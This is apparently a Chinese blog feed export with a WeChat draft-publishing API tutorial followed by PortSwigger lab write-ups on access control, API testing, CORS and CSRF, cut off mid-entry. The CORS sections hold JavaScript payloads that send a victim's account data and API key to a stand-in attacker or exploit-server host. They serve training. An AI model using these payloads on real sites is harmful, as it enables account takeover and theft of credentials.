    <content type="html"><![CDATA[<p>随着 crush_v3.0 版本发布，一直在思考通过何种方式，将漏洞更新信息推送给有需要，但是无法在本地进行项目搭建的人，于是有了这篇文章。</p><h2 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h2><p>之所以称之为半自动化推送，是因为能够通过脚本，利用 API 自动化完成文章内容编辑，新建草稿，封面配图等步骤，但是无法实现文章发表，只能进行文章发布（发布的文章只有自己能看到），因此，使用脚本将草稿写好后，需要手动到 app 或者网页端进行文章推送。<br>1、利用 APPKEY 和 APPSECRET 获取 ACCESS TOKEN<br>2、新增永久素材，用作封面配图<br>3、新建草稿<br>下面分别介绍每一步的实现方法。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><h3 id="获取-access-token"><a href="#获取-access-token" class="headerlink" title="获取 access token"></a>获取 access token</h3><p>到设置与开发–基本配置处，获取 appid 和 appsecret：<br><img src="/2023/04/27/file-upload/-20240331215215698.png"><br>到开发者文档，查看 api 调用方式。<br><img src="/2023/04/27/file-upload/-20240331215335472.png"><br>根据接口调用说明，来获取 access_token：<br><img src="/2023/04/27/file-upload/-20240331215412500.png"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">import requests<br>import json<br><br><span class="hljs-attribute">response</span> <span class="hljs-operator">=</span> requests.get(<span class="hljs-string">&quot;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=xxx&amp;secret=xxx&quot;</span>)<br><span class="hljs-attribute">res</span> <span class="hljs-operator">=</span> response.json()<br><span class="hljs-attribute">token</span> <span class="hljs-operator">=</span> res.get(<span class="hljs-string">&quot;access_token&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以利用上面的脚本来进行获取：<br><img src="/2023/04/27/file-upload/-20240331215552033.png"></p><h3 id="新增永久素材"><a href="#新增永久素材" class="headerlink" title="新增永久素材"></a>新增永久素材</h3><p>这里上传一个永久素材，用作文章的封面。<br><img src="/2023/04/27/file-upload/-20240331220257890.png"><br>这里利用 postman 实现。<br>url 为 <a href="https://api.weixin.qq.com/cgi-bin/material/add_material?access_token=xxxxxx&type=image">https://api.weixin.qq.com/cgi-bin/material/add_material?access_token=xxxxxx&amp;type=image</a> ，添加图片，会返回一个 media_id。<br><img src="/2023/04/27/file-upload/-20240331220235883.png"></p><h3 id="新建草稿"><a href="#新建草稿" class="headerlink" title="新建草稿"></a>新建草稿</h3><p>同样根据官方文档，填写相应配置即可。<br><img src="/2023/04/27/file-upload/-20240331220437854.png"><br>thumb_media_id 的值即为上一步获取到的内容。<br>最终效果如下，通过脚本即可实现草稿的编写，后续手动发表即可。<br><img src="/2023/04/27/file-upload/-20240331220540595.png"></p><h2 id="踩雷"><a href="#踩雷" class="headerlink" title="踩雷"></a>踩雷</h2><p>1、access_token 有时限，因此每次推送需要获取新的 token<br>2、在编写脚本时，发现 json 格式或者普通文本格式里的换行符等，到草稿中均无法被正确解析，需要利用 html 标签来实现换行（br）<br>3、如果内容中含有中文字符，会默认进行 unicode 编码，需要在代码中进行处理</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import json<br><br>response = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=xxx&amp;secret=xxx&quot;</span>)<br>res = response.json()<br>token = res.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;access_token&quot;</span>)<br><span class="hljs-built_in">print</span>(token)<br><br>def create_draft(access_token, title, content, media_id):<br>    url = <span class="hljs-string">&#x27;https://api.weixin.qq.com/cgi-bin/draft/add?access_token=&#123;&#125;&#x27;</span>.format(access_token)<br>    data = &#123;<br>    <span class="hljs-string">&quot;articles&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;title&quot;</span>: title,<br>            <span class="hljs-string">&quot;content&quot;</span>: content,<br>            <span class="hljs-string">&quot;thumb_media_id&quot;</span>: media_id,<br>            <span class="hljs-string">&quot;need_open_comment&quot;</span>: 0,<br>            <span class="hljs-string">&quot;only_fans_can_comment&quot;</span>: 0<br>        &#125;<br>    ]<br>&#125;<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br>    response = requests.post(url, <span class="hljs-attribute">data</span>=json.dumps(data, <span class="hljs-attribute">ensure_ascii</span>=<span class="hljs-literal">False</span>).encode(&#x27;utf-8&#x27;), <span class="hljs-attribute">headers</span>=headers)<br> <br>    rt_data = response.json()<br>    <span class="hljs-built_in">print</span>(rt_data)<br><br><br>with open(<span class="hljs-string">&quot;wechat.log&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) as f:<br>    content = f.read()<br>    content = content.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>)<br>    create_draft(token, <span class="hljs-string">&quot;test title&quot;</span>, content, <span class="hljs-string">&quot;xxx&quot;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — Portswigger Labs — Access Control Control</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AAccess%20Control/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AAccess%20Control/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-Portswigger-Labs-—-Access-Control-Control"><a href="#Portswigger-Labs-—-Portswigger-Labs-—-Access-Control-Control" class="headerlink" title="Portswigger Labs — Portswigger Labs — Access Control Control"></a>Portswigger Labs — Portswigger Labs — Access Control Control</h1><h2 id="未经保护的admin页面"><a href="#未经保护的admin页面" class="headerlink" title="未经保护的admin页面"></a>未经保护的admin页面</h2><p>访问&#x2F;robots.txt:</p><p><img src="/2023/04/27/file-upload/-20231213132217926.png" alt="image-20231213132217926"></p><p>拼接，即可直接访问管理员页面：</p><p><img src="/2023/04/27/file-upload/-20231213132241617.png" alt="image-20231213132241617"></p><h2 id="未经保护的admin页面（URL不可预测）"><a href="#未经保护的admin页面（URL不可预测）" class="headerlink" title="未经保护的admin页面（URL不可预测）"></a>未经保护的admin页面（URL不可预测）</h2><p>查看页面源代码，发现&#x2F;admin-4mbdyv：</p><p><img src="/2023/04/27/file-upload/-20231213132958548.png" alt="image-20231213132958548"></p><p>该url即为管理页面：</p><p><img src="/2023/04/27/file-upload/-20231213133037056.png" alt="image-20231213133037056"></p><h2 id="通过请求参数控制用户角色"><a href="#通过请求参数控制用户角色" class="headerlink" title="通过请求参数控制用户角色"></a>通过请求参数控制用户角色</h2><p>登录wiener账户后，访问admin：</p><p><img src="/2023/04/27/file-upload/-20231213133446926.png" alt="image-20231213133446926"></p><p>401未授权，只有admin才能访问。注意在cookie字段中有admin&#x3D;false，将false改为true再次访问：</p><p><img src="/2023/04/27/file-upload/-20231213133526067.png" alt="image-20231213133526067"></p><p>成功访问管理界面。再次发包：<br><img src="/2023/04/27/file-upload/-20231213133637783.png" alt="image-20231213133637783"></p><p>成功删除。</p><h2 id="用户角色可在用户配置文件中修改"><a href="#用户角色可在用户配置文件中修改" class="headerlink" title="用户角色可在用户配置文件中修改"></a>用户角色可在用户配置文件中修改</h2><p>登录后，修改邮箱，发现在提交修改的返回包中存在roleid，值为1：</p><p><img src="/2023/04/27/file-upload/-20231213134132011.png" alt="image-20231213134132011"></p><p>重新修改邮箱，尝试修改服务器返回包，将roleid改为2：</p><p><img src="/2023/04/27/file-upload/-20231213134200320.png" alt="image-20231213134200320"></p><p>再次访问&#x2F;admin，失败：</p><p><img src="/2023/04/27/file-upload/-20231213134444326.png" alt="image-20231213134444326"></p><p>在更改邮箱的请求包中添加roleid:2 </p><p><img src="/2023/04/27/file-upload/-20231213135406741.png" alt="image-20231213135406741"></p><p>成功访问&#x2F;admin。</p><h2 id="通过请求参数控制用户ID"><a href="#通过请求参数控制用户ID" class="headerlink" title="通过请求参数控制用户ID"></a>通过请求参数控制用户ID</h2><p>用wiener登录后，会得到wiener的API key。</p><p>将请求包中的id改为carlos，即可获取carlos的API key：</p><p><img src="/2023/04/27/file-upload/-20231213135836272.png" alt="image-20231213135836272"></p><h2 id="用户ID由请求参数控制（用户ID不可预测）"><a href="#用户ID由请求参数控制（用户ID不可预测）" class="headerlink" title="用户ID由请求参数控制（用户ID不可预测）"></a>用户ID由请求参数控制（用户ID不可预测）</h2><p>重复上面的步骤，发现userid变成了随机数：</p><p><img src="/2023/04/27/file-upload/-20231213140344532.png" alt="image-20231213140344532"></p><p>在post中找一个carlos发布的，点击查看其id：</p><p><img src="/2023/04/27/file-upload/-20231213140319106.png" alt="image-20231213140319106"></p><p>修改id，获取carlos的API key.</p><h2 id="请求参数控制用户ID（重定向时数据泄露）"><a href="#请求参数控制用户ID（重定向时数据泄露）" class="headerlink" title="请求参数控制用户ID（重定向时数据泄露）"></a>请求参数控制用户ID（重定向时数据泄露）</h2><p>将id改为carlos即可，可以在302跳转页面中看到carlos的API key：</p><p><img src="/2023/04/27/file-upload/-20231213141048126.png" alt="image-20231213141048126"></p><h2 id="请求参数控制用户ID（密码泄露）"><a href="#请求参数控制用户ID（密码泄露）" class="headerlink" title="请求参数控制用户ID（密码泄露）"></a>请求参数控制用户ID（密码泄露）</h2><p>登录wiener账户，发现存在密码：</p><p><img src="/2023/04/27/file-upload/-20231213141639191.png" alt="image-20231213141639191"></p><p>id改为administrator，将password的type改为text：</p><p><img src="/2023/04/27/file-upload/-20231213141710680.png" alt="image-20231213141710680"></p><p>成功。</p><h2 id="不安全的直接对象引用"><a href="#不安全的直接对象引用" class="headerlink" title="不安全的直接对象引用"></a>不安全的直接对象引用</h2><p>点击live chat，view transcript:</p><p><img src="/2023/04/27/file-upload/-20231213142343516.png" alt="image-20231213142343516"></p><p>发现下载的文件命名为数字.txt，并且递增。</p><p>爆破文件名：</p><p><img src="/2023/04/27/file-upload/-20231213142410502.png" alt="image-20231213142410502"></p><p>成功得到密码。</p><h2 id="可绕过的基于-URL-的访问控制"><a href="#可绕过的基于-URL-的访问控制" class="headerlink" title="可绕过的基于 URL 的访问控制"></a>可绕过的基于 URL 的访问控制</h2><p>直接访问&#x2F;admin：</p><p><img src="/2023/04/27/file-upload/-20231213143101228.png" alt="image-20231213143101228"></p><p>权限不足。</p><p>将url改为&#x2F;，添加X-Original-URL头：</p><p><img src="/2023/04/27/file-upload/-20231213143123629.png" alt="image-20231213143123629"></p><p>request in browser获取删除的接口，放到X-Original-Url中，成功删除：</p><p><img src="/2023/04/27/file-upload/-20231213143320255.png" alt="image-20231213143320255"></p><h2 id="可绕过的基于方法的访问控制"><a href="#可绕过的基于方法的访问控制" class="headerlink" title="可绕过的基于方法的访问控制"></a>可绕过的基于方法的访问控制</h2><p>使用administrator账号登录：</p><p><img src="/2023/04/27/file-upload/-20231213155308640.png" alt="image-20231213155308640"></p><p>点击admin panel，并且将carlos升级，查看数据包：</p><p><img src="/2023/04/27/file-upload/-20231213155327920.png" alt="image-20231213155327920"></p><p>在无痕窗口登录wiener账号，将wiener的cookie替换到上述请求中：</p><p><img src="/2023/04/27/file-upload/-20231213155401529.png" alt="image-20231213155401529"></p><p>401未授权。</p><p>将方法改为GET，修改username为wiener：</p><p><img src="/2023/04/27/file-upload/-20231213155426409.png" alt="image-20231213155426409"></p><p>成功。</p><h2 id="多步骤流程，一步无访问控制"><a href="#多步骤流程，一步无访问控制" class="headerlink" title="多步骤流程，一步无访问控制"></a>多步骤流程，一步无访问控制</h2><p>和前一个模块相同，不过无需更改请求方法，直接替换cookie即可：</p><p><img src="/2023/04/27/file-upload/-20231213160615826.png" alt="image-20231213160615826"></p><h2 id="基于referer的访问控制"><a href="#基于referer的访问控制" class="headerlink" title="基于referer的访问控制"></a>基于referer的访问控制</h2><p>这里提升权限的请求如下：</p><p><img src="/2023/04/27/file-upload/-20231213161407968.png" alt="image-20231213161407968"></p><p>如果直接将url复制到wiener的账户访问，会提示401未授权，因为做了referer校验。</p><p>同样替换cookie即可解决：</p><p><img src="/2023/04/27/file-upload/-20231213161521984.png" alt="image-20231213161521984"></p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — Portswigger Labs — Api-testing-testing</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AApi-testing/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AApi-testing/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-Portswigger-Labs-—-Api-testing-testing"><a href="#Portswigger-Labs-—-Portswigger-Labs-—-Api-testing-testing" class="headerlink" title="Portswigger Labs — Portswigger Labs — Api-testing-testing"></a>Portswigger Labs — Portswigger Labs — Api-testing-testing</h1><h2 id="利用Portswigger-Labs-—-Api-testing文档攻击"><a href="#利用Portswigger-Labs-—-Api-testing文档攻击" class="headerlink" title="利用Portswigger Labs — Api-testing文档攻击"></a>利用Portswigger Labs — Api-testing文档攻击</h2><p>直接在url后拼接并访问&#x2F;Portswigger Labs — Api-testing:</p><p><img src="/2023/04/27/file-upload/231211085758882.png" alt="image-20231211085758882"></p><p>DELETE方法，user为carlos：</p><p><img src="/2023/04/27/file-upload/231211090001687.png" alt="image-20231211090001687"></p><p>成功删除用户。</p><h2 id="利用查询语句进行服务器参数污染"><a href="#利用查询语句进行服务器参数污染" class="headerlink" title="利用查询语句进行服务器参数污染"></a>利用查询语句进行服务器参数污染</h2><p>Lab: Exploiting server-side parameter pollution in a query string</p><p>To solve the lab, log in as the <code>administrator</code> and delete <code>carlos</code>.</p><p>这一关没有提供账号密码，只有忘记密码的功能点，并且只有当username为administrator时才不会报错，否则提示用户名不存在。</p><p>拼接参数，username&#x3D;administrator%26(&amp;)x&#x3D;y:</p><p><img src="/2023/04/27/file-upload/231211093743961.png" alt="image-20231211093743961"></p><p>提示不支持该参数，可能是服务器拦截了，下面尝试#(%23):</p><p><img src="/2023/04/27/file-upload/231211093800197.png" alt="image-20231211093800197"></p><p>提示未指定field，拼接field参数，爆破：</p><p><img src="/2023/04/27/file-upload/231211093821717.png" alt="image-20231211093821717"></p><p><img src="/2023/04/27/file-upload/231211093838732.png" alt="image-20231211093838732"></p><p>这里email参数是合法的，响应200，并且给出了数据。</p><p><img src="/2023/04/27/file-upload/231211093655895.png" alt="image-20231211093655895"></p><p>在burp中查看历史报文，发现一个js文件，并且提示了密码重置的url为&#x2F;forgot-password?reset_token&#x3D;${}，如果获取了resetToken，即可重置对应用户的密码。</p><p><img src="/2023/04/27/file-upload/231211094114610.png" alt="image-20231211094114610"></p><p>查询token：</p><p><img src="/2023/04/27/file-upload/231211094144467.png" alt="image-20231211094144467"></p><p>拼接到url中，重置密码成功：</p><p><img src="/2023/04/27/file-upload/231211093626387.png" alt="image-20231211093626387"></p><h2 id="利用未使用的Portswigger-Labs-—-Api-testing"><a href="#利用未使用的Portswigger-Labs-—-Api-testing" class="headerlink" title="利用未使用的Portswigger Labs — Api-testing"></a>利用未使用的Portswigger Labs — Api-testing</h2><p>在点击商品时，会有一个&#x2F;Portswigger Labs — Api-testing&#x2F;products&#x2F;1&#x2F;price的请求，响应内容为商品的价格：</p><p><img src="/2023/04/27/file-upload/231211102614590.png" alt="image-20231211102614590"></p><p>将GET请求改为OPTIONS，发现还支持PATCH方法：</p><p><img src="/2023/04/27/file-upload/231211102625190.png" alt="image-20231211102625190"></p><p>改为PATCH方法：</p><p><img src="/2023/04/27/file-upload/231211102645533.png" alt="image-20231211102645533"></p><p>添加content-type头，设置为application&#x2F;json：</p><p><img src="/2023/04/27/file-upload/231211102709283.png" alt="image-20231211102709283"></p><p>提示在body中需要添加price字段，添加并设置价格为0：</p><p><img src="/2023/04/27/file-upload/231211102814076.png" alt="image-20231211102814076"></p><p>成功。</p><h2 id="批量赋值漏洞"><a href="#批量赋值漏洞" class="headerlink" title="批量赋值漏洞"></a>批量赋值漏洞</h2><p>在提交订单时，存在如下请求包：</p><p><img src="/2023/04/27/file-upload/231211103453668.png" alt="image-20231211103453668"></p><p>修改body内容，添加一个参数chosen_discount：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;chosen_discount&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;percentage&quot;</span>:<span class="hljs-number">100</span><br>    &#125;,<br>    <span class="hljs-string">&quot;chosen_products&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;product_id&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;quantity&quot;</span>:<span class="hljs-number">1</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/231211103509209.png" alt="image-20231211103509209"></p><p>成功购买。</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — CORS</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ACORS/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ACORS/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-CORS"><a href="#Portswigger-Labs-—-CORS" class="headerlink" title="Portswigger Labs — CORS"></a>Portswigger Labs — CORS</h1><p>最常见的测试方法就是请求中添加Origin 标头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sensitive-victim-data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://malicious-website.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>sessionid=...<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-keyword">Access</span>-Control-Allow-Origin: https://malicious-website.com<br><span class="hljs-keyword">Access</span>-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>...<br></code></pre></td></tr></table></figure><p>这些标头声明允许从请求域 （ <code>malicious-website.com</code> ） 进行访问，并且跨源请求可以包含 cookie （ <code>Access-Control-Allow-Credentials: true</code> ），因此将在会话中进行处理。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>req.onload = reqListener;<br>req.open(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://vulnerable-website.com/sensitive-victim-data&#x27;</span>,<span class="hljs-literal">true</span>);<br>req.withCredentials = <span class="hljs-literal">true</span>;<br>req.send();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span><span class="hljs-params">()</span> &#123;<br>   location=<span class="hljs-string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="hljs-keyword">this</span>.responseText;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="具有基本Origin反射的-Portswigger-Labs-—-CORS-漏洞"><a href="#具有基本Origin反射的-Portswigger-Labs-—-CORS-漏洞" class="headerlink" title="具有基本Origin反射的 Portswigger Labs — CORS 漏洞"></a>具有基本Origin反射的 Portswigger Labs — CORS 漏洞</h2><p>登录wiener账户，发现敏感信息：</p><p><img src="/2023/04/27/file-upload/0231214141243992.png" alt="image-20231214141243992"></p><p>将代码放到exploit server：</p><p><img src="/2023/04/27/file-upload/0231214141330406.png" alt="image-20231214141330406"></p><p>成功得到administrator的apikey：</p><p><img src="/2023/04/27/file-upload/0231214141318168.png" alt="image-20231214141318168"></p><h2 id="具有可信空源的-Portswigger-Labs-—-CORS-漏洞"><a href="#具有可信空源的-Portswigger-Labs-—-CORS-漏洞" class="headerlink" title="具有可信空源的 Portswigger Labs — CORS 漏洞"></a>具有可信空源的 Portswigger Labs — CORS 漏洞</h2><p>此时example.com不被允许：</p><p><img src="/2023/04/27/file-upload/0231214142359510.png" alt="image-20231214142359510"></p><p>尝试使用null：</p><p><img src="/2023/04/27/file-upload/0231214142430951.png" alt="image-20231214142430951"></p><p>成功。</p><p>下面结合iframe标签，投递payload（iframe sandbox会生成一个null origin请求）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> srcdoc=&quot;&lt;script&gt;<br>    <span class="hljs-keyword">var</span> req = new XMLHttpRequest();<br>    req.onload = reqListener;<br>    req.<span class="hljs-keyword">open</span>(&#x27;get&#x27;,&#x27;YOUR-<span class="hljs-keyword">LAB</span>-ID.web-security-academy.<span class="hljs-keyword">net</span>/accountDetails&#x27;,true);<br>    req.withCredentials = true;<br>    req.send();<br>    function reqListener() &#123;<br>        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.<span class="hljs-keyword">net</span>/<span class="hljs-keyword">log</span>?key=&#x27;+encodeURIComponent(this.responseText);<br>    &#125;;<br>&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0231214142724485.png" alt="image-20231214142724485"></p><h2 id="受信任的不安全协议的-Portswigger-Labs-—-CORS-漏洞"><a href="#受信任的不安全协议的-Portswigger-Labs-—-CORS-漏洞" class="headerlink" title="受信任的不安全协议的 Portswigger Labs — CORS 漏洞"></a>受信任的不安全协议的 Portswigger Labs — CORS 漏洞</h2><p>这里只有子域名不受限制：</p><p><img src="/2023/04/27/file-upload/0231214144234244.png" alt="image-20231214144234244"></p><p>点击商品页，check stock：</p><p><img src="/2023/04/27/file-upload/0231214144301502.png" alt="image-20231214144301502"></p><p>这里域名符合要求。</p><p>到exploit server投递payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://stock.0a6500ef0389b5e4812a5c2e00c1001b.web-security-academy.net/?productId=4</span></span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); req.<span class="hljs-property">onload</span> = reqListener; req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://0a6500ef0389b5e4812a5c2e00c1001b.web-security-academy.net/accountDetails&#x27;</span>,<span class="hljs-literal">true</span>); req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;req.<span class="hljs-title function_">send</span>();<span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) </span></span></span></span><span class="language-xquery">&#123;location=<span class="hljs-string">&#x27;https://exploit-0ad90010039ab5dc81185be9017500f3.exploit-server.net/log?key=&#x27;</span><span class="hljs-meta">%2bthis</span>.responseText; &#125;</span><span class="language-xml">;%3c/script&gt;</span><span class="language-xml">&amp;storeId=1&quot;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>将js代码拼接到productid参数后面即可。</p><p><img src="/2023/04/27/file-upload/0231214144449074.png" alt="image-20231214144449074"></p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — CSRF</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ACSRF/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ACSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-CSRF"><a href="#Portswigger-Labs-—-CSRF" class="headerlink" title="Portswigger Labs — CSRF"></a>Portswigger Labs — CSRF</h1><h2 id="没有任何防护的CSRF"><a href="#没有任何防护的CSRF" class="headerlink" title="没有任何防护的CSRF"></a>没有任何防护的CSRF</h2><p>登录后点击update email，抓包：</p><p><img src="/2023/04/27/file-upload/0231226132457797.png" alt="image-20231226132457797"></p><p>没有csrf-token等限制，直接生成CSRF POC，并将html复制到exploit server：</p><p><img src="/2023/04/27/file-upload/0231226132728904.png" alt="image-20231226132728904"></p><p>deliver exploit to victim即可。</p><h2 id="更改请求方法绕过验证"><a href="#更改请求方法绕过验证" class="headerlink" title="更改请求方法绕过验证"></a>更改请求方法绕过验证</h2><p>更新邮件并抓包：</p><p><img src="/2023/04/27/file-upload/0231226135116791.png" alt="image-20231226135116791"></p><p>在body中有csrf-token。</p><p>修改csrf token后repeat：</p><p><img src="/2023/04/27/file-upload/0231226135244826.png" alt="image-20231226135244826"></p><p>提示invalid csrf token。</p><p>将post方法改为get，成功：</p><p><img src="/2023/04/27/file-upload/0231226135325810.png" alt="image-20231226135325810"></p><p>不再验证token。同样复制payload到exploit server即可。</p><h2 id="删除csrf-token绕过验证"><a href="#删除csrf-token绕过验证" class="headerlink" title="删除csrf-token绕过验证"></a>删除csrf-token绕过验证</h2><p>同样抓包查看：</p><p><img src="/2023/04/27/file-upload/0231226140117196.png" alt="image-20231226140117196"></p><p>存在csrf-token。修改token后，更改请求方法无法成功。</p><p>尝试直接将token删除：</p><p><img src="/2023/04/27/file-upload/0231226140313414.png" alt="image-20231226140313414"></p><p>成功。</p><h2 id="未绑定到用户session的csrf-token"><a href="#未绑定到用户session的csrf-token" class="headerlink" title="未绑定到用户session的csrf-token"></a>未绑定到用户session的csrf-token</h2><p>前面所有的方法都会失败：</p><p><img src="/2023/04/27/file-upload/0231226144650046.png" alt="image-20231226144650046"></p><p>点击update抓包，复制csrf，drop：</p><p><img src="/2023/04/27/file-upload/0231226144605251.png" alt="image-20231226144605251"></p><p>新开一个浏览器，同样update email，将前一步的csrf替换进去：</p><p><img src="/2023/04/27/file-upload/0231226144908125.png" alt="image-20231226144908125"></p><p>成功修改。</p><p>按照第一个lab的步骤，生成CSRF poc，将csrf token替换成一个未利用过的即可。</p><h2 id="与非会话cookie绑定的csrf-token"><a href="#与非会话cookie绑定的csrf-token" class="headerlink" title="与非会话cookie绑定的csrf-token"></a>与非会话cookie绑定的csrf-token</h2><p>这里给出了两个账号，分别登录后发送到repeater。</p><p>发现在同时替换csrfKEY和csrf后可以正常完成请求。</p><p><img src="/2023/04/27/file-upload/0231226151236924.png" alt="image-20231226151236924"></p><p>在搜索处，没有csrf的防护：</p><p><img src="/2023/04/27/file-upload/0231226151422888.png" alt="image-20231226151422888"></p><p>因此借助search参数，将个人的csrfKey注入到浏览器：</p><p><img src="/2023/04/27/file-upload/0231226151506038.png" 